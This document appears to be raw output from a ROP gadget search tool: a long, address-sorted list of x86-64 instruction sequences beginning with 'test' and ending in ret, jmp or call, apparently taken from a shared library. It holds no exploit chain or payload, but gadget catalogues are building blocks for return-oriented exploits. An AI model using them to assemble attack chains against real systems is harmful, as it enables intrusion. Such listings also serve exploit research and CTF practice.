0x00002aaaaac6a0b8 : test byte ptr [rbx - 0x7c790004], 0xfc ; call qword ptr [rsi]
0x00002aaaaac6e368 : test byte ptr [rbx - 9], ah ; jmp rsp
0x00002aaaaab50c5e : test byte ptr [rbx], 0x80 ; jne 0x7bc7b ; add rsp, 0x28 ; pop rbx ; pop rbp ; ret
0x00002aaaaab5902e : test byte ptr [rbx], ah ; add dword ptr [rax], eax ; add byte ptr [rax - 0x7d], cl ; jmp qword ptr [rax]
0x00002aaaaab5872f : test byte ptr [rbx], al ; add al, byte ptr [rax] ; add byte ptr [rax - 0x77], cl ; ret
0x00002aaaaab5abbe : test byte ptr [rbx], bh ; add dword ptr [rax], eax ; add byte ptr [rax - 0x7d], cl ; jmp qword ptr [rax]
0x00002aaaaabd7f40 : test byte ptr [rbx], bh ; add eax, 0xf6310000 ; mov rdi, r12 ; call rbx
0x00002aaaaac46352 : test byte ptr [rbx], bl ; add al, byte ptr [rax] ; add byte ptr [rbx - 0x7bf0ed07], al ; ret 2
0x00002aaaaac74abc : test byte ptr [rbx], cl ; add byte ptr [rax + 0x32], al ; jmp 0x19faca
0x00002aaaaabb2f83 : test byte ptr [rcx + 0x44894cdd], 0x24 ; adc byte ptr [rax - 0x77], cl ; ret
0x00002aaaaac01943 : test byte ptr [rcx + 0x48fffffe], al ; mov edi, dword ptr [rsp + 0x60] ; call rax
0x00002aaaaac6aea8 : test byte ptr [rcx + 0x6f94ffe9], cl ; add byte ptr [rax], al ; movsb byte ptr [rdi], byte ptr [rsi] ; mov ebp, ecx ; jmp rsp
0x00002aaaaab6b9fb : test byte ptr [rcx + 0xf], 0x95 ; ret 0x8445
0x00002aaaaabeb59f : test byte ptr [rcx + rax], bh ; add byte ptr [rax - 0x77], cl ; ret
0x00002aaaaab5be1f : test byte ptr [rcx + rax], bh ; add byte ptr [rcx + rcx*4 - 0xa], cl ; call rax
0x00002aaaaab0c8b2 : test byte ptr [rcx + rcx*4 - 0x11], 0x48 ; mov edx, ebp ; call r15
0x00002aaaaab12ad1 : test byte ptr [rcx + rcx*4 - 0x11], 0xf ; xchg eax, ebp ; ret 0x941
0x00002aaaaab8e9b3 : test byte ptr [rcx + rcx*4 - 0x19], 0x4d ; mov ecx, edi ; call rbx
0x00002aaaaab84403 : test byte ptr [rcx - 0x48], 0x40 ; add byte ptr [rax], al ; add byte ptr [rcx - 0x77], cl ; ret
0x00002aaaaab25302 : test byte ptr [rcx - 0x77000000], dh ; ret 0xe283
0x00002aaaaabd6c42 : test byte ptr [rcx - 0x77], 0xd4 ; mov rbp, rax ; call rax
0x00002aaaaabadfb2 : test byte ptr [rcx - 0x7cfffffb], bh ; ret 0x3902
0x00002aaaaab9bb3a : test byte ptr [rcx - 0x7d], 0xc6 ; add dword ptr [rax - 0x7d], ecx ; ret
0x00002aaaaab58a57 : test byte ptr [rcx - 0xa000000], dl ; ret
0x00002aaaaac6a3fc : test byte ptr [rcx - 4], bh ; inc dword ptr [rcx + rdi*2] ; cld ; push qword ptr [rax + rdi*2 - 4] ; jmp rsp
0x00002aaaaac19446 : test byte ptr [rcx], 0 ; add byte ptr [rax - 0x7d], cl ; ret 0xeb10
0x00002aaaaaaf7c7b : test byte ptr [rcx], al ; add eax, dword ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret
0x00002aaaaabf7250 : test byte ptr [rcx], dl ; add dword ptr [rax], eax ; add byte ptr [rax - 0x7d], cl ; ret 0x3904
0x00002aaaaabd834c : test byte ptr [rdi + 3], ah ; add byte ptr [rax], al ; xor esi, esi ; mov rdi, r15 ; call rbx
0x00002aaaaaba5c26 : test byte ptr [rdi + rdi*8 - 1], dh ; dec dword ptr [rax - 0x7d] ; ret
0x00002aaaaac5d060 : test byte ptr [rdi - 0x587b000d], ah ; jmp rax
0x00002aaaaab2c49b : test byte ptr [rdi - 0x7600000c], dh ; ret
0x00002aaaaab1c64e : test byte ptr [rdi - 0x7b000000], bh ; fisttp dword ptr [rdi] ; xchg eax, ebp ; ret 0x854d
0x00002aaaaac0c81c : test byte ptr [rdi - 0x7d000000], al ; ret 0x3901
0x00002aaaaab71e2a : test byte ptr [rdi - 0x8fffff5], bh ; ret 0
0x00002aaaaab7193d : test byte ptr [rdi - 0x8fffff6], ch ; ret 0
0x00002aaaaab54124 : test byte ptr [rdi - 0x9fffffc], al ; ret
0x00002aaaaabf59c3 : test byte ptr [rdi], 0x84 ; mov byte ptr [rax], 0 ; add byte ptr [rcx - 0xa], al ; ret 0xf01
0x00002aaaaab8b24c : test byte ptr [rdi], 0x84 ; ret
0x00002aaaaabd70ba : test byte ptr [rdi], 0x84 ; ret 0
0x00002aaaaaaf9ab3 : test byte ptr [rdi], 0x85 ; ret 3
0x00002aaaaabc13c9 : test byte ptr [rdi], 0x95 ; ret 0x3145
0x00002aaaaab34eba : test byte ptr [rdi], 0x9f ; ret 0xd629
0x00002aaaaab4c412 : test byte ptr [rdi], 4 ; sete al ; ret
0x00002aaaaab4c422 : test byte ptr [rdi], 8 ; sete al ; ret
0x00002aaaaab7aaf8 : test byte ptr [rdi], al ; add byte ptr [rax], al ; ret
0x00002aaaaab6a46c : test byte ptr [rdi], al ; add dword ptr [rax], eax ; add byte ptr [rax - 0x7d], cl ; ret 0xe901
0x00002aaaaab6a454 : test byte ptr [rdi], cl ; add dword ptr [rax], eax ; add byte ptr [rax - 0x7d], cl ; ret 0xe901
0x00002aaaaabc25f1 : test byte ptr [rdi], cl ; add dword ptr [rax], eax ; add byte ptr [rcx - 0x7d], cl ; ret 0x4118
0x00002aaaaaafb552 : test byte ptr [rdi], cl ; add dword ptr [rax], eax ; add byte ptr [rcx - 0xa], al ; ret
0x00002aaaaabd7a7c : test byte ptr [rdi], dl ; or eax, 0xf6310000 ; mov rdi, r15 ; call rbx
0x00002aaaaab02e84 : test byte ptr [rdx + 0x200], al ; ret
0x00002aaaaac849bc : test byte ptr [rdx + 1], cl ; add byte ptr [rax], ah ; pop rbx ; cmc ; jmp qword ptr [rcx]
0x00002aaaaac6d184 : test byte ptr [rdx + 1], dl ; add byte ptr [rax + rcx], al ; hlt ; call rsp
0x00002aaaaac6f3dc : test byte ptr [rdx + rax], ch ; add byte ptr [rbx + rax - 6], al ; call rsp
0x00002aaaaab529be : test byte ptr [rdx + rax], dl ; add byte ptr [rax], al ; mov rdx, rax ; jmp 0x7d9e7
0x00002aaaaaba409f : test byte ptr [rdx + rcx - 0x49f10000], ch ; xor byte ptr [rax - 0x77], cl ; ret 0x8040
0x00002aaaaab98c21 : test byte ptr [rdx - 0x16000016], bh ; ret 0xfff3
0x00002aaaaac6d3d8 : test byte ptr [rdx - 0xb], al ; jmp rsp
0x00002aaaaac6f6d8 : test byte ptr [rdx - 6], dl ; lcall ptr [rdx + rax*2 + 0x53440002] ; cli ; call rsp
0x00002aaaaac6f264 : test byte ptr [rdx], ah ; add al, byte ptr [rax] ; xchg eax, esp ; leave ; stc ; call rsp
0x00002aaaaac801bc : test byte ptr [rdx], al ; add dword ptr [rax], eax ; in eax, -0xe ; call qword ptr [rsi]
0x00002aaaaab3b2ca : test byte ptr [rdx], cl ; or al, 0 ; add byte ptr [rcx - 0x77], cl ; ret
0x00002aaaaac085dc : test byte ptr [rip + 0x48ffffff], dl ; mov edi, ebp ; call rax
0x00002aaaaabe4ff4 : test byte ptr [rip - 0x76ffffff], bl ; ret 0x8944
0x00002aaaaabc531e : test byte ptr [rip - 0x7a000001], ah ; fisttp dword ptr [rdi] ; xchg eax, ebp ; ret
0x00002aaaaab5fdad : test byte ptr [rsi + 0x48000000], bl ; bsf eax, edx ; ret
0x00002aaaaab5c03d : test byte ptr [rsi + 1], bl ; add byte ptr [rax], al ; mov rdx, r12 ; mov rdi, r15 ; call rax
0x00002aaaaac86dbc : test byte ptr [rsi + 1], ch ; add al, al ; and esi, esi ; jmp qword ptr [rsi]
0x00002aaaaab71949 : test byte ptr [rsi - 0x8fffff6], cl ; ret 0
0x00002aaaaab07e75 : test byte ptr [rsi], al ; add dword ptr [rax], eax ; add byte ptr [rax - 0x7d], cl ; ret
0x00002aaaaab5fbed : test byte ptr [rsi], bh ; add byte ptr [rax], al ; bsf rax, rdx ; ret
0x00002aaaaac83dbc : test byte ptr [rsi], bh ; add dword ptr [rax], eax ; adc byte ptr [rdi], bl ; cmc ; jmp qword ptr [rcx]
0x00002aaaaab093b5 : test byte ptr [rsi], bh ; add dword ptr [rax], eax ; add byte ptr [rax - 0x7d], cl ; ret 0x8001
0x00002aaaaac6f600 : test byte ptr [rsi], bh ; cli ; jmp rsp
0x00002aaaaab0095d : test byte ptr [rsi], bl ; add dword ptr [rax], eax ; add byte ptr [rax - 0x7d], cl ; ret
0x00002aaaaac81dbc : test byte ptr [rsi], bl ; add dword ptr [rax], eax ; loopne 0x1acd59 ; hlt ; call qword ptr [rcx]
0x00002aaaaab5c2ad : test byte ptr [rsi], dh ; add dword ptr [rax], eax ; add byte ptr [rcx + rcx*4 - 0x1a], cl ; mov rdi, rbx ; call rax
0x00002aaaaac6f0cc : test byte ptr [rsi], dl ; add al, byte ptr [rax] ; xchg ecx, r15d ; call rsp
0x00002aaaaabf693e : test byte ptr [rsp + rax - 0x7cb80000], ch ; ret 0x4104
0x00002aaaaab7f032 : test ch, 0xf0 ; je 0xaa02b ; movzx eax, cl ; pop rbx ; ret
0x00002aaaaab91e3f : test ch, ah ; add dword ptr [rax], eax ; add byte ptr [rax - 0x77], cl ; ret
0x00002aaaaac70739 : test ch, al ; call qword ptr [rax]
0x00002aaaaac70751 : test ch, al ; jmp qword ptr [rcx]
0x00002aaaaabc7d11 : test ch, ch ; add al, byte ptr [rax] ; add byte ptr [rcx - 0x75], cl ; push rbp ; add byte ptr [rax - 0x77], cl ; ret
0x00002aaaaac02758 : test ch, dh ; add byte ptr [rax], al ; add byte ptr [rax - 0x77], cl ; out dx, eax ; call qword ptr [rbx]
0x00002aaaaab2c788 : test cl, ah ; add byte ptr [rax], al ; add byte ptr [rbx - 0x4e343], al ; call qword ptr [rax]
0x00002aaaaabd8147 : test cl, ah ; add eax, 0xf6310000 ; mov rdi, r15 ; call rbx
0x00002aaaaabe5857 : test cl, bh ; adc dword ptr [rax], eax ; add byte ptr [rax - 0x7d], cl ; ret
0x00002aaaaabb09ea : test cl, cl ; add dword ptr [rax], eax ; add dh, dh ; ret
0x00002aaaaac6fae0 : test cl, cl ; cli ; jmp rsp
0x00002aaaaabfaa9b : test cl, cl ; jne 0x1259ec ; ret
0x00002aaaaab72f78 : test cl, cl ; jne 0x9df6d ; ret
0x00002aaaaab730b7 : test cl, cl ; jne 0x9e0ae ; xor eax, eax ; ret
0x00002aaaaab7e5af : test cl, cl ; jne 0xa95a4 ; ret
0x00002aaaaab7e65f : test cl, cl ; jne 0xa9654 ; ret
0x00002aaaaab7e91f : test cl, cl ; jne 0xa9918 ; sub rax, 1 ; ret
0x00002aaaaab7f05a : test dh, 0xf0 ; je 0xaa029 ; movzx eax, dl ; pop rbx ; ret
0x00002aaaaab7f05a : test dh, 0xf0 ; je 0xaa02b ; movzx eax, dl ; pop rbx ; ret
0x00002aaaaab5ba51 : test dh, 7 ; mov eax, 0x16 ; je 0x86a6a ; ret
0x00002aaaaabf9adc : test dh, bh ; add al, byte ptr [rax] ; add byte ptr [rcx], bh ; ret
0x00002aaaaab440c4 : test dh, bh ; add byte ptr [rax], al ; add byte ptr [rax - 0x77], cl ; ret 0x8b48
0x00002aaaaac5cb6d : test dh, bl ; call qword ptr [rsi]
0x00002aaaaac5cb49 : test dh, bl ; jmp rdx
0x00002aaaaab95d4d : test dh, ch ; adc eax, dword ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret
0x00002aaaaab73170 : test dh, dh ; jne 0x9e167 ; mov qword ptr [rdx], rcx ; ret
0x00002aaaaaaf8b85 : test dh, dh ; mov edx, 0xffffffff ; cmovs eax, edx ; ret
0x00002aaaaac44d74 : test dl, 0x40 ; jne 0x16fd39 ; lea rax, qword ptr [rdi + 7] ; ret
0x00002aaaaabab74a : test dl, 1 ; je 0xd6716 ; and ebx, 8 ; je 0xd66f5 ; pop rbx ; ret
0x00002aaaaac44da2 : test dl, 4 ; jne 0x16fd39 ; lea rax, qword ptr [rdi + 3] ; ret
0x00002aaaaab91cbb : test dl, al ; add byte ptr [rax], al ; add byte ptr [rcx - 0x7f], cl ; ret
0x00002aaaaaba1da6 : test dl, ch ; add byte ptr [rax], al ; add byte ptr [rax + 0x7f], bh ; ret
0x00002aaaaab56635 : test dl, dl ; add al, 0 ; add byte ptr [rcx - 0xa], al ; ret 0xf01
0x00002aaaaab80367 : test dl, dl ; je 0xab38b ; mov cl, dl ; and cl, 0xf ; je 0xab39b ; ret
0x00002aaaaab08bd2 : test dl, dl ; jne 0x33bb4 ; ret
0x00002aaaaab72f34 : test dl, dl ; jne 0x9df2d ; ret
0x00002aaaaab73229 : test dl, dl ; jne 0x9e222 ; xor edx, edx ; mov qword ptr [rdi], rdx ; ret
0x00002aaaaab732a7 : test dl, dl ; jne 0x9e293 ; pop rbx ; xor edx, edx ; mov qword ptr [rdi], rdx ; ret
0x00002aaaaab7e7cf : test dl, dl ; jne 0xa97c8 ; lea rax, qword ptr [rcx - 1] ; ret
0x00002aaaaaba5a1e : test dl, dl ; jne 0xd0a06 ; ret
0x00002aaaaaba5cbc : test dl, dl ; jne 0xd0cb2 ; mov rax, r12 ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaab63c49 : test dword ptr [rax + 0x48fffffb], edi ; mov eax, edi ; ret
0x00002aaaaab7ae2b : test dword ptr [rax + 4], edx ; add byte ptr [rax], al ; ret
0x00002aaaaab7c33b : test dword ptr [rax + 7], edx ; add byte ptr [rax], al ; ret
0x00002aaaaab7c23b : test dword ptr [rax + 8], edx ; add byte ptr [rax], al ; ret
0x00002aaaaab94500 : test dword ptr [rax + rax], ecx ; add rax, rdi ; jmp rax
0x00002aaaaab3e60e : test dword ptr [rax - 0x16000005], edi ; ret 0xffff
0x00002aaaaab318d4 : test dword ptr [rax - 0x17000007], ebx ; ret 0xfc2f
0x00002aaaaab31d93 : test dword ptr [rax - 0x7a000007], edi ; ror byte ptr [rdi], 0x85 ; ret
0x00002aaaaab440c5 : test dword ptr [rax], 0x89480000 ; ret 0x8b48
0x00002aaaaac6c3ad : test dword ptr [rax], 0xef1f9400 ; jmp rsp
0x00002aaaaac7f685 : test dword ptr [rax], 0xf22c4800 ; jmp rcx
0x00002aaaaababbb9 : test dword ptr [rax], eax ; add al, byte ptr [rax] ; add byte ptr [rax - 0x77], cl ; ret 0x8341
0x00002aaaaab5a2a3 : test dword ptr [rax], eax ; add al, byte ptr [rax] ; add byte ptr [rax - 0x7d], cl ; call qword ptr [rax]
0x00002aaaaab2ab89 : test dword ptr [rax], eax ; add byte ptr [rax], al ; add byte ptr [rax + 0x29], cl ; ret
0x00002aaaaab59997 : test dword ptr [rax], eax ; add rax, r13 ; jmp rax
0x00002aaaaab3a89a : test dword ptr [rax], esi ; adc dword ptr [rax], eax ; add dh, dh ; ret
0x00002aaaaab59996 : test dword ptr [rax], r8d ; add rax, r13 ; jmp rax
0x00002aaaaac594d0 : test dword ptr [rbp - 0x9aff276], esp ; mov al, 0xee ; fcmovb st(0), st(3) ; ret
0x00002aaaaab68c1f : test dword ptr [rbp - 0xc000004], esp ; ret
0x00002aaaaab734de : test dword ptr [rbp], edi ; add byte ptr [rax], al ; xor eax, eax ; ret
0x00002aaaaaad6b12 : test dword ptr [rbx + 0x59e7c8ee], esi ; pop rbx ; ret 0x2a63
0x00002aaaaab7ff60 : test dword ptr [rbx + 1], ecx ; add byte ptr [rax], al ; ret
0x00002aaaaab80888 : test dword ptr [rbx + 1], esp ; add byte ptr [rax], al ; lea rax, qword ptr [rdi - 0x10] ; ret
0x00002aaaaac3cfe8 : test dword ptr [rbx + 2], eax ; add byte ptr [rax], al ; ret
0x00002aaaaac3cfc8 : test dword ptr [rbx + 2], esp ; add byte ptr [rax], al ; ret
0x00002aaaaac3cee0 : test dword ptr [rbx + 3], ecx ; add byte ptr [rax], al ; ret
0x00002aaaaac0df6c : test dword ptr [rbx + 5], ebx ; add byte ptr [rax - 0x77], cl ; ret 0xff31
0x00002aaaaab7c430 : test dword ptr [rbx + 6], ebx ; add byte ptr [rax], al ; ret
0x00002aaaaac436f7 : test dword ptr [rbx + 7], edx ; add byte ptr [rax], al ; xor eax, eax ; ret
0x00002aaaaac43b46 : test dword ptr [rbx + rax], eax ; add byte ptr [rax], al ; xor eax, eax ; ret
0x00002aaaaaad7b83 : test dword ptr [rbx - 0x2e], ebp ; cmp dl, byte ptr [rdi] ; ret
0x00002aaaaac26ff3 : test dword ptr [rbx - 0x76b703aa], 0x5789f74f ; cld ; ret
0x00002aaaaac2f293 : test dword ptr [rbx - 0x76b703b2], 0x4f89f757 ; cld ; ret
0x00002aaaaabb8a14 : test dword ptr [rbx - 0xa000000], esi ; ret 0x7420
0x00002aaaaab42828 : test dword ptr [rbx], 0x8000 ; je 0x6d843 ; mov eax, edx ; pop rbx ; ret
0x00002aaaaab454f1 : test dword ptr [rbx], 0x8000 ; je 0x7050b ; mov eax, esi ; pop rbx ; ret
0x00002aaaaab45673 : test dword ptr [rbx], 0x8000 ; je 0x7068b ; mov eax, esi ; pop rbx ; ret
0x00002aaaaab4618a : test dword ptr [rbx], 0x8000 ; je 0x711ab ; mov eax, edx ; pop rbx ; ret
0x00002aaaaab46321 : test dword ptr [rbx], 0x8000 ; je 0x7133b ; mov eax, edx ; pop rbx ; ret
0x00002aaaaab4ab7f : test dword ptr [rbx], 0x8000 ; je 0x75b9b ; mov eax, edx ; pop rbx ; ret
0x00002aaaaab4af84 : test dword ptr [rbx], 0x8000 ; je 0x75f9b ; mov eax, edx ; pop rbx ; ret
0x00002aaaaab4b0a8 : test dword ptr [rbx], 0x8000 ; je 0x760c3 ; mov eax, esi ; pop rbx ; ret
0x00002aaaaab4b1ea : test dword ptr [rbx], 0x8000 ; je 0x7620b ; mov eax, esi ; pop rbx ; ret
0x00002aaaaab4b4cf : test dword ptr [rbx], 0x8000 ; je 0x764eb ; mov eax, edx ; pop rbx ; ret
0x00002aaaaab4be74 : test dword ptr [rbx], 0x8000 ; je 0x76e8b ; mov eax, edx ; pop rbx ; ret
0x00002aaaaab4d080 : test dword ptr [rbx], 0x8000 ; je 0x7809b ; mov eax, edx ; pop rbx ; ret
0x00002aaaaab3378c : test dword ptr [rbx], eax ; add al, byte ptr [rax] ; add byte ptr [rcx - 0x73], cl ; dec dword ptr [r8 + 0x39] ; ret
0x00002aaaaab73448 : test dword ptr [rbx], eax ; add dword ptr [rax], eax ; add byte ptr [rsi + 0xf], ah ; xlatb ; ret
0x00002aaaaab104fb : test dword ptr [rbx], esi ; add al, byte ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0x4801
0x00002aaaaab62f2a : test dword ptr [rcx + 0x48000000], esi ; xor eax, eax ; ret
0x00002aaaaab63960 : test dword ptr [rcx + 0x48fffffe], esp ; mov eax, edi ; ret
0x00002aaaaac3ccea : test dword ptr [rcx + 5], eax ; add byte ptr [rax], al ; ret
0x00002aaaaac436cd : test dword ptr [rcx + 7], esi ; add byte ptr [rax], al ; xor eax, eax ; ret
0x00002aaaaab7aa12 : test dword ptr [rcx + 8], ebp ; add byte ptr [rax], al ; ret
0x00002aaaaac435dd : test dword ptr [rcx + 8], esp ; add byte ptr [rax], al ; xor eax, eax ; ret
0x00002aaaaac434ed : test dword ptr [rcx + 9], edx ; add byte ptr [rax], al ; xor eax, eax ; ret
0x00002aaaaaba2fd3 : test dword ptr [rcx + rax - 0x49f10000], esp ; add dword ptr [rax - 0x7d], ecx ; ret 0x8401
0x00002aaaaab7ffa7 : test dword ptr [rcx + rax], eax ; add byte ptr [rax], al ; ret
0x00002aaaaac46c27 : test dword ptr [rcx + rax], edx ; add byte ptr [rax], al ; ret
0x00002aaaaab7ff77 : test dword ptr [rcx + rax], esi ; add byte ptr [rax], al ; ret
0x00002aaaaac3d08a : test dword ptr [rcx - 0x3cffffff], esp ; ret
0x00002aaaaab0cb7e : test dword ptr [rcx - 0x3f], 0x834904eb ; ret
0x00002aaaaab32532 : test dword ptr [rcx - 0x7600000a], ecx ; ret
0x00002aaaaaafbb0b : test dword ptr [rcx], ebx ; add eax, 0x8d480000 ; add cl, byte ptr [rax + 0x39] ; ret
0x00002aaaaabc6552 : test dword ptr [rcx], ecx ; add byte ptr [rax + 0x63], cl ; add al, 0x82 ; add rdx, rax ; jmp rdx
0x00002aaaaab55ed2 : test dword ptr [rcx], edi ; add dword ptr [rax], eax ; add byte ptr [rbp + 0x39], cl ; ret 0x976
0x00002aaaaab63b4a : test dword ptr [rdi + 0x48fffffc], esi ; mov eax, edi ; ret
0x00002aaaaab7ab77 : test dword ptr [rdi + rax], eax ; add byte ptr [rax], al ; ret
0x00002aaaaab7ab57 : test dword ptr [rdi + rax], esp ; add byte ptr [rax], al ; ret
0x00002aaaaab0af23 : test dword ptr [rdi + rcx*8], eax ; setne al ; movzx eax, al ; ret
0x00002aaaaab68a35 : test dword ptr [rdi - 0xc000002], ecx ; ret
0x00002aaaaaafbb27 : test dword ptr [rdi], eax ; add eax, 0x8d480000 ; add ecx, dword ptr [rax + 0x39] ; ret
0x00002aaaaab0b106 : test dword ptr [rdi], eax ; setne al ; movzx eax, al ; ret
0x00002aaaaab7ad11 : test dword ptr [rdx + 5], ebp ; add byte ptr [rax], al ; ret
0x00002aaaaab7c119 : test dword ptr [rdx + 9], esi ; add byte ptr [rax], al ; ret
0x00002aaaaac44a42 : test dword ptr [rdx + rax], edi ; add byte ptr [rax], al ; xor eax, eax ; ret
0x00002aaaaac43412 : test dword ptr [rdx + rcx], ebp ; add byte ptr [rax], al ; xor eax, eax ; ret
0x00002aaaaabd7a5d : test dword ptr [rdx], 0xf6310000 ; mov rdi, r14 ; call rbx
0x00002aaaaab109cb : test dword ptr [rdx], eax ; add al, byte ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0x4801
0x00002aaaaac3cfa7 : test dword ptr [rdx], eax ; add byte ptr [rax], al ; ret
0x00002aaaaab8092d : test dword ptr [rsi + 0x48000000], edi ; lea eax, dword ptr [rdi - 0x10] ; ret
0x00002aaaaab1b26d : test dword ptr [rsi + 0xffffffb], esp ; mov dh, 0x43 ; add dword ptr [rax - 0x7d], ecx ; ret
0x00002aaaaac465b2 : test dword ptr [rsi + 1], ebp ; add byte ptr [rax], al ; xor eax, eax ; ret
0x00002aaaaab7ab35 : test dword ptr [rsi + 7], eax ; add byte ptr [rax], al ; ret
0x00002aaaaab7ab15 : test dword ptr [rsi + 7], esp ; add byte ptr [rax], al ; ret
0x00002aaaaab7aa2d : test dword ptr [rsi + 8], ecx ; add byte ptr [rax], al ; ret
0x00002aaaaab80b69 : test dword ptr [rsi - 0x7b000000], ecx ; sal byte ptr [rax + rbx + 0x49], 0x83 ; ret 0x4908
0x00002aaaaab68d1e : test dword ptr [rsi - 0xc000005], esp ; ret
0x00002aaaaababba3 : test dword ptr [rsi], edx ; add al, byte ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0xeb04
0x00002aaaaac43918 : test dword ptr [rsi], esp ; add eax, 0xc0310000 ; ret
0x00002aaaaab2cfd1 : test dword ptr [rsp + rsi*8 - 1], edi ; dec dword ptr [rax - 0x77] ; fucompi st(0) ; ret 0xfc78
0x00002aaaaaba1823 : test eax, 0x39fffffe ; ret
0x00002aaaaac0c733 : test eax, 0x480028b8 ; add esp, 8 ; ret
0x00002aaaaabde02b : test eax, 0x48002bd3 ; mov eax, dword ptr [rax + 0x18] ; add dword ptr [rax], 1 ; ret
0x00002aaaaabebfc7 : test eax, 0x48f88948 ; add esp, 8 ; ret
0x00002aaaaabd9573 : test eax, 0x48fff68a ; add esp, 0x408 ; ret
0x00002aaaaabd8bfb : test eax, 0x49fff1bc ; mov edi, dword ptr [rsi] ; call rbx
0x00002aaaaac7a845 : test eax, 0x4e880000 ; out dx, al ; jmp qword ptr [rdx]
0x00002aaaaac7a87d : test eax, 0x4f200000 ; out dx, al ; call qword ptr [rdx]
0x00002aaaaabf13f3 : test eax, 0x4fbe0f48 ; add dword ptr [rbx + 0x460f09fb], eax ; ret
0x00002aaaaac6b8b5 : test eax, 0x59440000 ; in eax, dx ; jmp rsp
0x00002aaaaabffd93 : test eax, 0x5b0029cf ; ret
0x00002aaaaac59500 : test eax, 0x7d4c8c5d ; ret 0xd8f
0x00002aaaaac2d446 : test eax, 0x7f0f41f3 ; add byte ptr [rax - 0x7f], cl ; ret 0x80
0x00002aaaaab09c58 : test eax, 0x7fffff ; je 0x34c51 ; ret
0x00002aaaaab3a9cf : test eax, 0x83000000 ; ret 0x8308
0x00002aaaaab358fc : test eax, 0x89000007 ; ret 0x348
0x00002aaaaab69eaf : test eax, 0x8948fff8 ; ret
0x00002aaaaac6a641 : test eax, 0xa8b2fffc ; cld ; inc dword ptr [rdx - 0x58] ; cld ; call rdx
0x00002aaaaac6a57d : test eax, 0xa950fffc ; cld ; jmp rax
0x00002aaaaac694cd : test eax, 0xb59dfffd ; std ; call rcx
0x00002aaaaac5d0a5 : test eax, 0xbc2dfff3 ; call qword ptr [rax]
0x00002aaaaac5e916 : test eax, 0xc3fffb00 ; add dh, bh ; jmp rdi
0x00002aaaaac8a8a5 : test eax, 0xe2080001 ; sti ; call rsi
0x00002aaaaab809b1 : test eax, 1 ; je 0xaba2b ; lea rax, qword ptr [rdi - 0x10] ; ret
0x00002aaaaabda3df : test eax, eax ; cmove eax, edx ; ret
0x00002aaaaab9084f : test eax, eax ; cmove rax, rdx ; add rsp, 0x28 ; ret
0x00002aaaaab0f6f4 : test eax, eax ; cmovs eax, edx ; pop rbx ; ret
0x00002aaaaabd982c : test eax, eax ; je 0x1048d0 ; call rax
0x00002aaaaabd99a3 : test eax, eax ; je 0x104aa8 ; call rax
0x00002aaaaabe6fa0 : test eax, eax ; je 0x111f84 ; mov rax, qword ptr [r12 + 0x38] ; jmp 0x111f78
0x00002aaaaabe772f : test eax, eax ; je 0x11275b ; mov rdi, qword ptr [rdx + 0x50] ; mov rsi, rdx ; call rax
0x00002aaaaabe9988 : test eax, eax ; je 0x114994 ; ret
0x00002aaaaabe9c80 : test eax, eax ; je 0x114cb4 ; call rax
0x00002aaaaabebaaa : test eax, eax ; je 0x116ac0 ; add rsp, 8 ; ret
0x00002aaaaabf3eb5 : test eax, eax ; je 0x11eec5 ; mov rdi, rbx ; call rax
0x00002aaaaabf3eb5 : test eax, eax ; je 0x11eec9 ; mov rdi, rbx ; call rax
0x00002aaaaabf41ad : test eax, eax ; je 0x11f1bd ; mov rdi, rbx ; call rax
0x00002aaaaabf42bd : test eax, eax ; je 0x11f2d5 ; lea rdi, qword ptr [rip + 0x2a83d8] ; call rax
0x00002aaaaabfc750 : test eax, eax ; je 0x12775c ; ret
0x00002aaaaabff451 : test eax, eax ; je 0x12a43f ; xor eax, eax ; pop rbx ; ret
0x00002aaaaabffc91 : test eax, eax ; je 0x12aca1 ; mov rdi, rsp ; call rax
0x00002aaaaabffd7c : test eax, eax ; je 0x12ad8c ; mov rdi, rsp ; call rax
0x00002aaaaac00632 : test eax, eax ; je 0x12b642 ; mov rdi, rbp ; call rax
0x00002aaaaac009b6 : test eax, eax ; je 0x12b9c4 ; ret
0x00002aaaaac016c3 : test eax, eax ; je 0x12c6d3 ; mov rdi, r14 ; call rax
0x00002aaaaac01c41 : test eax, eax ; je 0x12cc56 ; xor eax, eax ; ret
0x00002aaaaac02755 : test eax, eax ; je 0x12d856 ; mov rdi, rbp ; call qword ptr [rbx]
0x00002aaaaac066a0 : test eax, eax ; je 0x1316b8 ; lea rdi, qword ptr [rbx + 0xc8] ; call rax
0x00002aaaaac07058 : test eax, eax ; je 0x132068 ; mov rdi, r12 ; call rax
0x00002aaaaac07239 : test eax, eax ; je 0x13224b ; lea rdi, qword ptr [rbp + 0x10] ; call rax
0x00002aaaaac085d9 : test eax, eax ; je 0x133501 ; mov rdi, rbp ; call rax
0x00002aaaaac08513 : test eax, eax ; je 0x133523 ; mov rdi, r13 ; call rax
0x00002aaaaac08706 : test eax, eax ; je 0x133716 ; mov rdi, rbp ; call rax
0x00002aaaaac08926 : test eax, eax ; je 0x133936 ; mov rdi, rbp ; call rax
0x00002aaaaac0941d : test eax, eax ; je 0x13442f ; lea rdi, qword ptr [rbx + 0x68] ; call rax
0x00002aaaaac09ac9 : test eax, eax ; je 0x134ad9 ; mov rdi, r12 ; call rax
0x00002aaaaac09e3d : test eax, eax ; je 0x134e4f ; lea rdi, qword ptr [rbx + 0x58] ; call rax
0x00002aaaaac0c6c8 : test eax, eax ; je 0x13765a ; mov qword ptr fs:[rbx], rax ; pop rbx ; ret
0x00002aaaaac0c64d : test eax, eax ; je 0x13765d ; pop rbx ; ret
0x00002aaaaac0caff : test eax, eax ; je 0x137b18 ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaac0d3b9 : test eax, eax ; je 0x1383cb ; lea rdi, qword ptr [rbp + 0x10] ; call rax
0x00002aaaaac0dad2 : test eax, eax ; je 0x138ae4 ; lea rdi, qword ptr [rbp + 0x10] ; call rax
0x00002aaaaac12186 : test eax, eax ; je 0x13d196 ; xor eax, eax ; ret
0x00002aaaaac19e53 : test eax, eax ; je 0x144e5f ; xchg eax, edx ; sub eax, edx ; ret
0x00002aaaaac1ae38 : test eax, eax ; je 0x145e44 ; xchg eax, edx ; sub eax, edx ; ret
0x00002aaaaac4838c : test eax, eax ; je 0x17339b ; call rax
0x00002aaaaab00023 : test eax, eax ; je 0x2b02d ; call rax
0x00002aaaaab01379 : test eax, eax ; je 0x2c383 ; call rax
